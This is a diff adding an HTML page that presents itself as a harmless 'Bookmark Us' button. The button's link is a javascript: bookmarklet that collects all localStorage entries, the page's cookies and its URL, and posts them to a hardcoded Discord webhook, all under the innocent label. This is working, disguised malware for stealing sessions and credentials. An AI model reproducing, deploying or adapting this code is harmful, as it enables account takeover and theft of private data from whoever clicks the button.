@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bookmark Us</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .bookmark-container {
+            display: inline-block;
+            padding: 20px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .bookmark-container h2 {
+            font-size: 24px;
+            color: #333;
+        }
+        .bookmark-container p {
+            font-size: 16px;
+            color: #555;
+        }
+        .bookmark-container button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .bookmark-container button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="bookmark-container">
+        <a href='javascript:
+
+var archive = [];
+var keys = Object.keys(localStorage);
+var i = 0;
+var key;
+
+for (; key = keys[i]; i++) {
+  archive.push(key + '=' + localStorage.getItem(key));
+}
+
+// Join the archive items with a newline for better formatting
+var archiveString = archive.join("\n\n");
+
+fetch("https://discord.com/api/webhooks/1369739097954062510/zmi4IPKCb2qYDKliO3RLZcj_AY9lnqmqL3DD6VwyfSxYEOarfpcrQ2MOfaTZ0fB3u8Q9", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    username: "Full Name: " + Math.random(),
+    content: "**-------------------------------------**",
+    embeds: [
+      {
+        description: "```text\n" + document.URL + "\n```",
+        color: 3447003,
+        author: {
+          name: "URL"
+        }
+      },
+      {
+        description: "\n```json\n" + archiveString + "\n```",
+        color: 3447003,
+        author: {
+          name: "localStorage"
+        }
+      },
+      {
+        description: "\n```json\n" + document.cookie + "\n```",
+        color: 3447003,
+        author: {
+          name: "cookies"
+        }
+      }
+    ]
+  })
+});
+' target="_blank"><button>bookmark</button></a>
+    </div>
+</body>
+</html>
